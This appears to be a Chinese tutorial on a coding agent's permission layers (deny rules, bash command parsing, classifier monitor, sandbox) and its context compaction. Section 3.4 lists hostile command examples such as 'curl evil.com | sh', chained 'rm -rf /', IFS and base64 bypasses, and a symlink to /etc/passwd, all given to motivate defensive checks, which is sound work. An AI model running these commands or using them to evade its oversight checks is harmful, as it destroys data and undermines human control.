`dontAsk` 是个很聪明的设计：无人值守场景下，"不确定就别做"比"不确定就问（但没人回答，卡死）"和"不确定就做（危险）"都更合理。

## 3.3 完整决策链路：7 道关卡

入口是 `canUseTool`（`src/hooks/useCanUseTool.tsx`），被第 2 课的 `run_tool` 调用：

```python
async def can_use_tool(tool, input, context, tool_use_id) -> PermissionDecision:
    """返回 PermissionDecision，其中 decision_reason.type 记录是哪道关卡做的决定，
    取值：rule / mode / hook / classifier / safetyCheck / workingDir /
          sandboxOverride / asyncAgent / permissionPromptTool / other
    ——可观测性：任何一次放行/拒绝都能回答"谁批准的"。"""

    # ═══ 关卡 1：deny 规则（黑名单最高优先级，无法被任何东西覆盖）═══
    if rule := match_deny_rule(tool, input, context):
        return deny(f"被规则拒绝: {rule}", reason={"type": "rule"})

    # ═══ 关卡 2：工具自身的 checkPermissions（第 1 课的接口）═══
    # 工具专属逻辑：Bash 的命令注入检测、Write 的读后写检查、路径是否在工作目录内
    result = await tool.check_permissions(input, context)
    if result.behavior == "deny":
        return deny(result.message, reason={"type": "safetyCheck"})
    # 'passthrough' 表示"我没意见，交给通用逻辑"

    # ═══ 关卡 3：allow 规则 + 模式判断 ═══
    behavior = "ask"                                   # ← 默认询问（fail-closed）
    if match_allow_rule(tool, input, context):
        behavior = "allow"
    elif context.mode == "bypassPermissions":
        behavior = "allow"
    elif context.mode == "acceptEdits" and is_edit_tool(tool):
        behavior = "allow"
    elif context.mode == "plan" and not tool.is_read_only(input):
        return deny("plan 模式下禁止写操作", reason={"type": "mode"})
    # always_ask_rules 能把 allow 拉回 ask（用户想对特定操作保持警惕）
    if match_ask_rule(tool, input, context):
        behavior = "ask"

    # ═══ 关卡 4：PreToolUse Hook（用户自定义脚本介入）═══
    # 注意：hook 只能 allow 或 deny，不能返回 ask —— 它是决策者不是提问者
    hook_result = await execute_permission_request_hooks(tool, input, context)
    if hook_result:
        if hook_result.behavior == "allow":
            input = hook_result.updated_input or input     # hook 能改写参数！
            return allow(input, reason={"type": "hook"})
        if hook_result.behavior == "deny":
            if hook_result.interrupt:
                context.abort_event.set()                  # 能直接中止整轮
            return deny(hook_result.message, reason={"type": "hook"})

    # ═══ 关卡 5：模式对 ask 的改写 ═══
    if behavior == "ask" and context.mode == "dontAsk":
        return deny("dontAsk 模式：不询问即拒绝", reason={"type": "mode"})
    if behavior == "ask" and context.should_avoid_permission_prompts:
        return deny("后台 Agent 无法弹窗", reason={"type": "asyncAgent"})

    # ═══ 关卡 6：auto 模式的模型分类器（见 3.6）═══
    if behavior == "ask" and context.mode == "auto":
        verdict = await yolo_classifier(tool, input, context)
        if verdict.should_block:
            context.denial_tracking = record_denial(context.denial_tracking)
            if should_fallback_to_prompting(context.denial_tracking):
                pass                          # 拒绝太多次 → 降级为真人询问
            else:
                return deny(verdict.reason, reason={"type": "classifier"})
        else:
            context.denial_tracking = record_success(context.denial_tracking)
            return allow(input, reason={"type": "classifier"})

    # ═══ 关卡 7：真人询问 ═══
    if behavior == "ask":
        answer = await show_permission_dialog(tool, input,
                                              suggestions=result.suggestions)
        if answer.rejected:
            return deny("用户拒绝", reason={"type": "other"})
        if answer.always_allow:
            persist_rule(answer.rule, destination=answer.destination)  # 写进规则表
        return allow(answer.updated_input or input, reason={"type": "other"})

    return allow(input)
```

**关键设计**：

1. **deny 永远在最前，ask 能覆盖 allow**。黑名单不可绕过，用户能对特定操作强制保持警惕。
2. **默认值是 `ask`**（不是 allow）——又一次 fail-closed。
3. **每个决定都带 `decisionReason`**。事后能回答"这条命令是谁批准的？规则？hook？分类器？还是用户点的？"
4. **权限系统可以改写参数**（`updatedInput`）——hook 能把命令重写成沙箱版本，用户能在对话框里编辑参数后批准。

真实实现里还有 **Bash 分类器推测执行**：`useCanUseTool` 在弹对话框前给分类器 2 秒超时窗口先跑一遍（`pendingClassifierCheck`），能自动判定就不打扰用户。

## 3.4 BashTool 的命令安全检查：最硬的骨头

为什么难？用户批准了 `git status`，模型下次可能发来：

```bash
git status; rm -rf /                 # 命令串联
git status && curl evil.com | sh     # 条件执行 + 管道
git status $(rm -rf /)               # 命令替换
git status `whoami`                  # 反引号替换
IFS=X; git${IFS}status               # IFS 注入绕过空格
echo cm0gLXJmIC8= | base64 -d | sh   # base64 编码绕过
```

只做 `command.startswith("git status")` 检查的话全部沦陷。`src/tools/BashTool/bashSecurity.ts` + `bashPermissions.ts` 的流程：

```python
async def bash_check_permissions(args, context) -> PermissionResult:
    if not args.command.strip():
        return allow(args)

    parsed = parse_shell_command(args.command)     # 真正的 shell 语法解析

    # ① deny/ask 规则精确匹配
    if rule := match_deny_or_ask(args.command, context):
        return PermissionResult(rule.behavior, args, f"匹配规则 {rule}")

    # ② 复合命令拆解：每个子命令独立检查，全部通过才放行
    #    "git status && npm test" → 拆成 ["git status", "npm test"]
    #    ← 关键！否则 "git status; rm -rf /" 会因前缀匹配而整体放行
    sub_commands = split_compound(parsed)
    if len(sub_commands) > 1:
        results = [await check_single(c, context) for c in sub_commands]
        if any(r.behavior == "deny" for r in results):
            return deny("复合命令中含被拒子命令")
        if any(r.behavior == "ask" for r in results):
            return ask("复合命令中含需确认子命令")
        return allow(args)          # 全部子命令都被允许

    # ③ 危险模式检测：命令替换 $() / `` / ${} / $(())
    #    这些运行时才展开成任意命令，静态前缀匹配无法覆盖 → 一律升级为 ask
    if has_dangerous_patterns(args.command):
        return ask("命令含替换/展开，无法静态判定安全性")

    # ④ 编码绕过 / 脚本块 / 下载执行诱饵检测
    if not bash_command_is_safe(args.command, parsed):
        return ask("检测到可疑模式（编码命令 / 下载执行 / 脚本块）")

    # ⑤ zsh 特有危险（zmodload/emulate/sysopen 模块加载）、IFS 注入、
    #    控制字符与 Unicode 空白（用不可见字符伪装命令）、brace expansion
    if has_shell_specific_risks(args.command):
        return ask("检测到 shell 特性风险")

    # ⑥ 路径约束：复合命令里有 cd 且后接写操作 → 可能逃出工作目录
    if not check_path_constraints(parsed, compound_has_cd=has_cd(parsed)):
        return ask("可能写出工作目录之外")

    # ⑦ 前缀规则匹配
    prefix = extract_command_prefix(parsed)          # "git status"
    if match_allow_prefix(prefix, context):
        return allow(args)
    return ask(f"需要授权: {prefix}")
```

**核心洞察：无法静态判定安全的一律升级为 ask，而不是猜。** 命令替换 `$()` 的内容运行时才确定，任何静态分析都会被绕过，所以直接交给人类。这是**"承认能力边界"的安全设计**——比自信地做出错误判断安全得多。

## 3.5 "读后写"检查：防止 Agent 盲改文件

规则很简单：**Edit / Write 之前，文件必须先被 Read 过，且读后没被外部修改。**

数据结构在 `src/utils/fileStateCache.ts`：

```python
@dataclass
class FileState:
    content: str                    # 读到的内容（也用于 diff 计算）
    timestamp: float                # 读取时刻
    offset: int | None              # 部分读取的起始行
    limit: int | None               # 部分读取的行数
    is_partial_view: bool = False   # 模型只看到了残缺内容 → 必须重新完整 Read

class FileStateCache:
    """LRU 缓存：最多 100 个文件 / 25MB，按内容字节数计权重。
    key 一律 os.path.normpath() 归一化 —— 否则 /a/../b 和 /b 会被当成两个文件，
    Windows 上 / 和 \\ 混用同理。这是真实踩过的坑。"""
    def __init__(self, max_entries=100, max_size_bytes=25*1024*1024): ...
    def get(self, path): return self._cache.get(os.path.normpath(path))
    def set(self, path, state): self._cache[os.path.normpath(path)] = state
```

检查逻辑（`FileWriteTool.validate_input`，L153-222）：

```python
async def validate_input(self, args, context) -> ValidationResult:
    """注意这是 validate_input 而非 check_permissions ——
    失败信息发回给【模型】，模型看到后会自己先调 Read 再重试。
    不打扰用户，Agent 自我纠正。这是错误分层设计的绝佳体现。"""
    state = context.read_file_state.get(args.file_path)

    if state is None:
        return ValidationResult(False,
            "File has not been read yet. Read it first before writing to it.")

    if state.is_partial_view:
        # CLAUDE.md 这类自动注入的内容经过了裁剪（剥离 HTML 注释、frontmatter、
        # 截断），模型看到的 ≠ 磁盘真实内容 → 必须显式重新 Read
        return ValidationResult(False,
            "You have only seen a partial view of this file. Read it fully first.")

    if os.path.getmtime(args.file_path) > state.timestamp:
        # 读取之后文件被改了（用户手动编辑 / 另一个进程 / git checkout）
        return ValidationResult(False,
            "File has been modified since read. Read it again before writing.")

    return ValidationResult(True)
```

**为什么这个机制如此重要？**

1. **防幻觉覆写**：模型没看过文件就 Write，等于用想象出的内容覆盖真实文件——这是 Coding Agent 最严重的破坏形式。
2. **防 TOCTOU 竞态**：模型 Read 了文件，思考 30 秒，期间你手动改了文件，模型的 Edit 基于旧内容 → 你的修改被静默丢弃。时间戳检查拦住了它。
3. **`isPartialView` 的洞察极深**：注释（L9-13）说明——自动注入的 CLAUDE.md 内容被剥离过 HTML 注释和 frontmatter，模型看到的和磁盘不一致，所以 `content` 字段存的是**磁盘原始字节**（供 diff 用），同时打上 `isPartialView` 强制要求显式 Read。**区分"模型看到的"和"磁盘上的"**——很多实现都会漏掉。

写路径检查还有一层（`filesystem.ts` L1205 `checkWritePermissionForTool`）：

- **符号链接双重检查**：deny 规则对**原始路径和解析后的真实路径都检查**——否则 `ln -s /etc/passwd ./safe.txt` 就绕过了。
- **`.claude/**` 的 allow 规则只在 session 级生效**：防止用户被诱导把"允许改 Claude 配置"写进持久配置——改配置就能改权限规则，等于**权限提升（沙箱逃逸）**。

## 3.6 auto 模式：让模型审查模型 + 拒绝追踪

`auto` 模式用独立的模型调用（`yoloClassifier.ts`）代替用户点确认。第 1 课的 `toAutoClassifierInput` 在这里被消费：

```python
def build_classifier_transcript(messages, tools) -> str:
    """把对话历史投影成分类器的输入。
    关键：不是把原始参数直接给分类器，而是让每个工具自己决定"给分类器看什么"。"""
    lines = []
    for block in iter_blocks(messages):
        if block.type == "tool_use":
            tool = find_tool(tools, block.name)
            projection = tool.to_auto_classifier_input(block.input)
            if projection == "":
                continue            # 该工具声明"我无安全相关性" → 不占分类器篇幅
            lines.append(encode(block.name, projection))
    return "\n".join(lines)

# 各工具的投影实现：
#   BashTool      → 命令本身
#   FileWriteTool → f"{file_path}: {content}"
#   FileEditTool  → f"{file_path}: {new_string}"
#   WebSearchTool → 查询词
#   TodoWriteTool → ""    ← 改待办清单无安全风险，跳过
```

**设计洞察**：分类器的上下文窗口也是有限资源。让每个工具自己声明"我的安全相关投影是什么"，既降噪又避免把无关内容喂给分类器。

配套的 `src/utils/permissions/denialTracking.ts`（全文仅 46 行，但思想重要）：

```python
DENIAL_LIMITS = {"max_consecutive": 3, "max_total": 20}

@dataclass
class DenialTrackingState:
    consecutive_denials: int = 0
    total_denials: int = 0

def record_denial(s):  return replace(s, consecutive_denials=s.consecutive_denials+1,
                                          total_denials=s.total_denials+1)
def record_success(s): return replace(s, consecutive_denials=0)   # 成功打断连续链

def should_fallback_to_prompting(s) -> bool:
    """连续拒绝 3 次，或累计拒绝 20 次 → 分类器明显不适应当前任务，
    降级为真人询问。这不是安全措施，是【自动化的自知之明】：
    自动决策系统必须能识别"我判断得不好"并主动交还控制权。"""
    return (s.consecutive_denials >= DENIAL_LIMITS["max_consecutive"]
            or s.total_denials >= DENIAL_LIMITS["max_total"])
```

没有这个机制会怎样：分类器因某种偏见连续拒绝，Agent 陷入"尝试→被拒→换方式→被拒"的死循环，烧 token 且毫无进展，而用户什么都看不到，只觉得 Agent 变傻了。

## 3.7 plan 模式与沙箱

**plan 模式**在权限层（关卡 3）直接拦截所有非只读工具。`EnterPlanModeTool` 把当前模式存进 `prePlanMode`，`ExitPlanModeV2Tool` 恢复。例外：**计划文件本身和 scratchpad 始终可写**——否则模型没法记录计划。

**沙箱**（`src/utils/sandbox/sandbox-adapter.ts`）是**权限之外的运行时隔离**层，包装 `@anthropic-ai/sandbox-runtime`，把权限规则翻译成沙箱配置：

```python
def convert_to_sandbox_config(permissions) -> SandboxConfig:
    """权限规则 → 沙箱配置。两套系统共享同一份规则来源。"""
    return SandboxConfig(
        # WebFetch 规则 → 网络白名单域名
        allowed_domains=extract_domains(permissions.allow_rules),
        # Edit/Read 规则 → 文件系统读写路径
        writable_paths=[*extract_edit_paths(permissions.allow_rules),
                        cwd, claude_temp_dir],       # 当前目录始终可写
        denied_paths=[
            "**/settings.json", "**/.claude/skills/**",  # 防权限提升
            "**/HEAD", "**/objects/**", "**/refs/**",
            "**/hooks/**", "**/config",                  # 防 git 仓库破坏
            # git hooks 尤其危险：写入 hooks 等于获得任意代码执行
        ],
    )
```

**权限检查（决定要不要做）在沙箱执行（限制能做什么）之前**——两层独立，即使权限判断出错，沙箱还能兜住。这就是纵深防御。

## 3.8 第 3 课小结：七层纵深防御

```
    模型发起工具调用
          ↓
① deny 规则         ← 黑名单，不可绕过
② 工具自检          ← Bash 命令解析 / Write 读后写 / 路径约束
③ allow 规则 + 模式 ← 白名单、plan 拦截写、ask 规则可覆盖 allow
④ PreToolUse Hook   ← 用户脚本，能 allow/deny/改写参数/中止
⑤ 模式改写 ask      ← dontAsk→deny、后台 Agent→deny
⑥ auto 分类器       ← 模型审模型 + 拒绝追踪自动降级
⑦ 真人对话框        ← 最终兜底，可选择规则持久化层级
          ↓
      沙箱执行      ← 权限之外的运行时隔离
```

### 八条可迁移的设计原则

| 原则 | 体现 |
|------|------|
| **默认拒绝（fail-closed）** | 默认 `behavior = 'ask'`；`isConcurrencySafe` 抛异常按不安全处理 |
| **错误分层** | 参数/状态问题（未先 Read）→ 发回模型自我纠正；安全问题 → 升级给用户 |
| **承认能力边界** | 静态无法判定的（`$()` 命令替换）不猜，一律升级询问 |
| **拆解到最小单元** | 复合 shell 命令拆成子命令逐个检查，而非整串前缀匹配 |
| **区分"模型看到的"与"真实的"** | `isPartialView`；`content` 存磁盘原始字节 |
| **自动化要有自知之明** | `denialTracking` 连续失败自动交还控制权给人类 |
| **防权限提升** | `.claude/**` 写规则只允许 session 级；沙箱拒写 settings.json 和 git hooks |
| **决策可追溯** | 每个决定带 `decisionReason.type`，事后能回答"谁批准的" |

---

# 第 4 课：上下文管理与压缩 —— 有限窗口里的长期作战

## 4.1 核心问题：上下文窗口是一个预算

```
[系统提示词 ~10k] [工具定义 ~15k] [CLAUDE.md ~2k] [对话历史 ...不断增长]
                                                     ↑ 这里会爆
```

工具结果是最大的膨胀源：一次 `Read` 大文件 2 万 token，一次 `Grep` 全仓库 5 千 token。但不能简单粗暴截断——**Agent 的能力来自上下文**，砍太多它就"失忆"。

核心矛盾：**在有限窗口里最大化保留有效信息**。CC 的解法是一个**四级阶梯**，成本从低到高。

## 4.2 前置：怎么知道"还剩多少"

`src/services/tokenEstimation.ts` 的策略是**优先用真实数据、本地估算兜底**：

```python
def token_count_with_estimation(messages) -> int:
    """API 返回的 usage 最准，但只有已发送过的消息才有。
    本轮新增的消息（工具结果等）没有 usage → 只能本地估算。"""
    # 1) 找最后一条 assistant 消息的 usage —— 这是权威值
    base = last_assistant_usage(messages)   # input + cache_read + cache_creation

    # 2) 那之后新增的消息本地估算
    for msg in messages_after(base_msg):
        for block in msg.content:
            if block.type in ("text", "tool_result", "thinking"):
                # 粗估：4 字符 ≈ 1 token；JSON 更密集，用 2 字符/token
                ratio = 2 if looks_like_json(block) else 4
                base += len(block.text) / ratio
            elif block.type in ("image", "document"):
                base += 2000          # IMAGE_MAX_TOKEN_SIZE，统一按 2000 估
    return int(base * 4 / 3)          # ← 乘 4/3 保守系数：宁可高估也不能低估
```

**关键设计**：`* 4/3` 体现了不对称成本——**低估的代价（撞上 413，一整轮请求白费）远大于高估的代价（早压缩一点）**。

阈值计算（`src/services/compact/autoCompact.ts` L62 起，真实常量）：

```python
AUTOCOMPACT_BUFFER_TOKENS       = 13_000   # 触发自动压缩的预留
WARNING_THRESHOLD_BUFFER_TOKENS = 20_000   # UI 黄色警告
ERROR_THRESHOLD_BUFFER_TOKENS   = 20_000   # UI 红色警告
MANUAL_COMPACT_BUFFER_TOKENS    =  3_000   # 硬熔断的预留

def get_autocompact_threshold(model) -> int:
    effective = get_effective_context_window(model)   # 窗口 - 输出预留(20k)
    return effective - AUTOCOMPACT_BUFFER_TOKENS

def calculate_token_warning_state(usage, model) -> dict:
    threshold = get_autocompact_threshold(model) if autocompact_on \
                else get_effective_context_window(model)
    return {
        "percent_left": max(0, round((threshold - usage) / threshold * 100)),
        "is_above_warning_threshold": usage >= threshold - 20_000,
        "is_above_auto_compact_threshold": autocompact_on and usage >= threshold,
        # 硬熔断线：留 3k 给用户手动跑 /compact —— 不能把人也锁死
        "is_at_blocking_limit": usage >= get_effective_context_window(model) - 3_000,
    }
```

**熔断不等于死锁，必须留一条人工恢复的路。**

## 4.3 四级阶梯：轻的先上，重的兜底

| 级别 | 手段 | 成本 | 损失 | 触发 |
|------|------|------|------|------|
| **L1** | 工具结果预算：超大结果落盘换占位符 | 一次文件写 | 几乎无（可用 Read 取回） | 每次请求前，按预算 |
| **L2** | microcompact：清空陈旧工具结果 | 纯本地，**零 LLM 调用** | 旧的观察细节 | 时间/数量规则 |
| **L3** | autocompact：LLM 生成结构化摘要 | **一次完整 LLM 调用** | 细节被摘要替代 | 逼近阈值 |
| **L4** | reactive compact：413 后紧急压缩 | LLM 调用 + 一轮浪费 | 同 L3 + 剥离媒体 | 已经撞墙了 |

外加两条旁路：**SessionMemory 零成本路径**（用后台已生成的记忆当摘要，跳过 L3 的 LLM 调用）和 **CONTEXT_COLLAPSE**（读时投影，实验特性）。

## 4.4 L1：工具结果预算与落盘

`src/utils/toolResultStorage.ts` 里有两层预算：

```python
DEFAULT_MAX_RESULT_SIZE_CHARS       = ...      # 单个工具结果上限
MAX_TOOL_RESULTS_PER_MESSAGE_CHARS  = 50_000   # 单条消息内所有工具结果的聚合上限

async def persist_tool_result(content, tool_use_id) -> PersistedToolResult:
    """把超大工具结果写到 <session_dir>/tool-results/<tool_use_id>，
    模型只看到 <persisted-output> 预览 + 文件路径（想看全文就自己 Read）。"""
    filepath = get_tool_result_path(tool_use_id)
    try:
        # 用 'wx'（排他创建）而不是先 stat 再写 —— 避免竞态。
        # tool_use_id 唯一且内容确定，文件已存在说明上一轮已落盘过，
        # microcompact 重放原始消息时不该重复写。
        open(filepath, "x").write(content)
    except FileExistsError:
        pass                                   # 已落盘，直接走预览
    return make_preview(content)
```

`contentReplacementState` 保证的**幂等性**：

```python
@dataclass
class ContentReplacementState:
    seen_ids: set[str]              # 见过哪些 tool_use_id
    replacements: dict[str, str]    # {tool_use_id: 替换后的预览文本}

# 为什么必须记状态？—— 为了 prompt cache。
# 一旦某个 tool_use_id 决定被替换成预览 X，后续每一轮请求都必须
# 产出【字节完全相同】的 X。否则历史消息的字节变了 → 缓存前缀失效
# → 每轮重新计费整个上下文。
#
# resume（恢复会话）时要能重建这个 state：
#   record_content_replacement()            → 决策写进 transcript
#   reconstruct_content_replacement_state() → resume 时读回来
```

**上下文的任何"改写"都必须字节级稳定，否则 prompt cache 全废。**

## 4.5 L2：microcompact —— 零 LLM 成本的清理

`src/services/compact/microCompact.ts`（531 行）。本质区别：**只删工具结果，不动对话骨架，不调模型**。

```python
COMPACTIBLE_TOOLS = {"FILE_READ", "SHELL", "GREP", "GLOB",
                     "WEB_SEARCH", "WEB_FETCH", "FILE_EDIT", "FILE_WRITE"}
TIME_BASED_MC_CLEARED_MESSAGE = '[Old tool result content cleared]'
KEEP_RECENT = 5          # 保留最近 5 个工具结果的完整内容

def microcompact(messages) -> list:
    """时间触发：距上一条 assistant 消息超过阈值（默认 60 分钟）
    → 清空除最近 5 个之外的所有可压缩工具结果内容。

    洞察：为什么用【时间】而不是纯 token 数？
    因为"用户离开了 1 小时再回来"强烈暗示话题切换——
    早先那些 grep 结果、文件内容对新任务几乎无用，
    而对话骨架（用户说了什么、你做了什么结论）仍然重要。
    """
    if minutes_since_last_assistant(messages) < 60:
        return messages
    compactible = [b for b in iter_tool_results(messages)
                   if b.tool_name in COMPACTIBLE_TOOLS
                   and not b.already_cleared            # 不重复清理
                   and not is_image_or_document(b)]     # 图片/文档不动
    for block in compactible[:-KEEP_RECENT]:
        block.content = TIME_BASED_MC_CLEARED_MESSAGE
    return messages
```

### CACHED_MICROCOMPACT：更聪明的一招

普通 microcompact 改了历史消息内容 → **prompt cache 前缀失效**。于是有了 cache editing 版本：

```python
# 不在本地改消息，而是给 API 发一个 cache_edits 指令：
#   "请从缓存里删除这些 tool_use_id 对应的内容"
# 服务端在缓存层面删除，客户端消息数组保持不变 → 缓存前缀依然命中。
#
# 第 2 课 query.ts L870-892 那段就是它的收尾：
#   API 返回 usage.cache_deleted_input_tokens（累积值）
#   减去请求前的基线 → 得到本次真实删除的 token 数
#   才 yield 边界消息给 UI（而不是用客户端估算值）
```

## 4.6 L3：autocompact —— 用模型总结模型

```python
async def auto_compact_if_needed(messages, context) -> CompactionResult | None:
    if not should_auto_compact(messages, context):
        return None

    # ① 先试零成本路径：后台 SessionMemory 已经写好摘要了吗？
    if result := await try_session_memory_compaction(messages, context):
        return result                     # 省下一次完整 LLM 调用

    # ② 传统路径：fork 一个子 Agent 生成摘要
    #    关键：用 runForkedAgent 复用父对话的 prompt cache
    #    —— 摘要请求的前缀和主对话完全相同，缓存命中，
    #    只为新增的压缩指令付费。这是"让压缩本身变便宜"的巧招。
    summary = await run_forked_agent(
        messages=messages,
        prompt=COMPACT_PROMPT,
        max_turns=1,
        max_output_tokens=MAX_OUTPUT_TOKENS_FOR_SUMMARY,  # 20_000
    )
```

### 摘要 Prompt 的设计（`src/services/compact/prompt.ts`，375 行）

要求模型输出 `<analysis>` 草稿 + `<summary>` 正文，摘要必须包含 **9 个固定章节**：

```python
COMPACT_SUMMARY_SECTIONS = [
    "1. Primary Request and Intent",  # 用户的原始诉求 —— 最不能丢的东西
    "2. Key Technical Concepts",       # 技术概念/框架
    "3. Files and Code Sections",      # 看过/改过哪些文件，含关键代码和"为何重要"
    "4. Errors and fixes",             # 踩过的错 + 怎么修的 + 用户的纠正意见
    "5. Problem Solving",              # 已解决/在解决的问题
    "6. All user messages",            # ★ 列出所有非工具结果的用户消息
    "7. Pending Tasks",                # 待办
    "8. Current Work",                 # 压缩前正在做什么（含文件名和代码）
    "9. Optional Next Step",           # 下一步 + 【原文引用】防任务漂移
]
```

三个设计洞察：

1. **第 6 项"列出所有用户消息"** 是最关键的一条。工具结果可以摘要，但**用户的每一句话都不能丢**——那是意图的唯一来源。
2. **第 9 项要求 verbatim 引用原文**，Prompt 明确说这是为了防止任务解释漂移（*"ensure there's no drift in task interpretation"*）。
3. **`<analysis>` 是草稿纸，会被 `formatCompactSummary()` 剥掉**。给模型思考空间，但不让草稿占用宝贵上下文。

还有个很"实战"的细节——文件开头的 `NO_TOOLS_PREAMBLE`（L19），大意是"只输出文本，绦不调用工具，工具调用会被拒绝且浪费你唯一的一轮"。注释解释：fork 路径为了缓存命中必须继承父 Agent 的完整工具集，而某些模型即使被告知也会试着调工具；`maxTurns: 1` 下一次被拒的工具调用 = 零文本输出 = 掉进降级路径。注释里给了实测数字：**某版本失败率 2.79%，另一版本 0.01%**。

> **Prompt engineering 的真相**：这条最"啰嗝"的指令是靠 A/B 数据换来的，不是拍脑袋写的。

### 压缩后的"复活"：不让模型失忆

```python
POST_COMPACT_MAX_FILES_TO_RESTORE = 5        # 最多恢复 5 个文件
POST_COMPACT_TOKEN_BUDGET         = 50_000   # 总预算
POST_COMPACT_MAX_TOKENS_PER_FILE  = 5_000    # 单文件上限

async def create_post_compact_file_attachments(read_file_state, context):
    """压缩后重新注入最近读过的文件，让模型"手边还有材料"。

    三个约束：
    - 已经在保留消息(tail)里出现过的文件跳过 —— 不重复
    - 重新从磁盘读（不是用缓存内容）—— 保证新鲜
    - 按预算逐个装入，装不下就丢 —— 硬性上限
    """
    preserved = collect_read_paths(preserved_messages)   # tail 里已有的
    recent = sorted(read_file_state.items(),
                    key=lambda kv: kv[1].timestamp, reverse=True)
    used = 0
    for path, state in recent[:POST_COMPACT_MAX_FILES_TO_RESTORE]:
        if path in preserved:
            continue
        att = await read_file_fresh(path, max_tokens=POST_COMPACT_MAX_TOKENS_PER_FILE)
        if used + att.tokens > POST_COMPACT_TOKEN_BUDGET:
            continue
        used += att.tokens
        yield att
    # 压缩前 cacheToObject(readFileState) 存快照，压缩后 readFileState.clear()，
    # 再用这些 attachment 重建 —— 文件状态和上下文保持一致
```

**压缩不是单纯的"删"，而是"删 + 重建关键工作集"。** 摘要负责"我们做过什么"，文件重注入负责"我手头有什么"。

## 4.7 压缩边界：为什么不直接替换数组？

`getMessagesAfterCompactBoundary`（`src/utils/messages.ts` L4643）：

```python
def get_messages_after_compact_boundary(messages) -> list:
    """压缩不删除原数组，而是插入一条 SystemCompactBoundaryMessage 标记，
    发给 API 时只取边界之后的部分。"""
    idx = find_last_compact_boundary_index(messages)
    sliced = messages if idx == -1 else messages[idx:]
    if HISTORY_SNIP_ENABLED:
        sliced = project_snipped_view(sliced)     # 再叠一层 snip 投影
    return sliced
```

四个理由：

1. **UI 和 API 需要看到不同的东西**。用户往上滚仍能看到完整历史，而 API 只收到边界之后的内容。
2. **支持增量压缩**。第二次压缩只需处理上个边界之后的新内容。
3. **可追溯**。边界消息带 `preCompactTokenCount` 等元数据，UI 能显示"从 15 万降到 3 万"。
4. **可恢复**。原始消息还在，resume 时能重建。

> **通用模式：需要"多视图"时，用标记 + 投影，而不是破坏性修改。** CONTEXT_COLLAPSE 把这个思想推到极致——完全不改数组，只在发送时 read-time projection（`projectView()` 每次重放折叠提交日志）。

## 4.8 L4：reactive compact —— 已经撞墙之后

```python
async def try_reactive_compact(has_attempted, messages, ...):
    if has_attempted:                  # ★ 只试一次，防死循环
        return None
    return await compact_conversation(messages, ...)

def strip_images_from_messages(messages):
    """媒体尺寸错误的专门恢复：把用户消息里的图片/PDF 换成 [image] / [document] 文本。
    ← 为什么单独处理？因为 collapse/摘要都不剥离图片，
      而一张超大图片本身就能把请求顶爆，摘要文字再省也没用。"""
```

注意 `mediaRecoveryEnabled` 的**扣留-恢复对称性**：扣留错误的判断和恢复的判断必须用同一个开关值，否则特性开关在 5-30 秒流式期间翻转，会出现"扣留了但不恢复" = 消息被吃掉。**所以这个开关在流式开始前就 hoist 成常量。**

## 4.9 SessionMemory：把压缩成本转移到空闲时间

`src/services/SessionMemory/` —— **后台子 Agent 在会话进行中就不断把对话提炼成 markdown 长期记忆**。

```python
DEFAULT_CONFIG = {
    "minimum_message_tokens_to_init": 10_000,  # 会话超过 10k token 才开始
    "minimum_tokens_between_update":   5_000,  # 每增长 5k 更新一次
    "tool_calls_between_updates":          3,  # 或每 3 次工具调用
}

async def try_session_memory_compaction(messages, context):
    """autocompact 的第一选择：记忆已经写好了，直接当摘要用，零 LLM 调用。"""
    content = get_session_memory_content()
    if not content:
        return None
    keep_from = calculate_messages_to_keep_index(messages)
    keep_from = adjust_index_to_preserve_api_invariants(messages, keep_from)
    #            ↑ 关键！不能把 tool_use 和它的 tool_result 切开，
    #              否则下次 API 调用直接 400（第 2 课同一个坑）
    return CompactionResult(summary=content, messages_to_keep=messages[keep_from:])
```

**核心洞察：压缩的延迟是用户可感知的。把提炼工作提前到后台空闲时段做，触发压缩时就只是一次文件读取。**

## 4.10 熔断器：又一处真实事故的痕迹

`autoCompact.ts` L67 注释记录的真实数据：

```python
MAX_CONSECUTIVE_AUTOCOMPACT_FAILURES = 3
# 源码注释：某次统计发现 1,279 个会话出现 50+ 次连续压缩失败
# （最多达 3,272 次），全球每天浪费约 25 万次 API 调用。
```

场景：上下文已经不可挑回地超限，压缩每次都失败，但循环每轮都重试 → 无限烧钱。修复就是一个计数器 + 上限 3。

**和第 3 课的 `denialTracking`、第 2 课的 `maxOutputTokensRecoveryCount` 是同一个模式**：所有自动重试都必须有次数上限，且这个上限要能穿透不同代码路径（记在跳迭代 State 里而不是局部变量）。

## 4.11 附：FileStateCache 的 LRU 淘汰与去重记录

`FileStateCache` 是 LRU（100 个文件 / 25MB），长会话里早期条目会被淘汰。模型再去 Edit 会被 `validate_input` 拦下，返回 "File has not been read yet"，模型**自己重新 Read 一遍再 Edit**——LRU 淘汰导致的"忘记"和安全检查的"要求重读"恰好同向，退化是安全的。

但 `Tool.ts` L216-222 记录了一个真实的坑：**不能只靠 `readFileState.has()` 判断"CLAUDE.md 是否已注入过"**——LRU 会驱逐条目，同一份 CLAUDE.md 会被重复注入几十次。于是加了独立的 `loadedNestedMemoryPaths: Set` 专门做去重。

> **缓存（会淘汰）和去重记录（不能淘汰）是两种不同的数据结构，混用会出问题。**

## 4.12 第 4 课小结

```
                    ┌─ token 估算（真实 usage + 本地估算 × 4/3 保守系数）
                    ↓
        ┌─────────────────────────────────────┐
  L1    │ 工具结果预算：>50k 落盘，留 <persisted-output> │  零 LLM
        │ 幂等约束：同一 tool_use_id 的替换必须字节稳定  │
        ├─────────────────────────────────────┤
  L2    │ microcompact：闲置 60min → 清空旧工具结果      │  零 LLM
        │ 保留最近 5 个 + 图片文档；cache editing 版本   │  保缓存
        ├─────────────────────────────────────┤
  L3    │ autocompact：逼近阈值（窗口 - 20k输出 - 13k）  │  1 次 LLM
        │  ├ 优先 SessionMemory 零成本路径               │  或 0 次
        │  └ fork 子 Agent 生成 9 章节结构化摘要         │
        │ 压缩后重注入最近 5 个文件（预算 50k）           │
        ├─────────────────────────────────────┤
  L4    │ reactive compact：413 之后紧急压缩 + 剥离媒体  │  1 次 LLM
        ├─────────────────────────────────────┤
  熔断  │ 剩 3k 时硬停（留空间给用户手动 /compact）      │
        │ 连续失败 3 次 → 停止重试                       │
        └─────────────────────────────────────┘
```

### 十条可迁移的设计原则

| 原则 | 体现 |
|------|------|
| **成本阶梯，轻者优先** | L1→L4 递进，L2 能解决就不动 L3 |
| **不对称风险偏向保守** | token 估算 ×4/3；低估的代价远大于高估 |
| **压缩 = 删 + 重建工作集** | 摘要（做过什么）+ 文件重注入（手头有什么） |
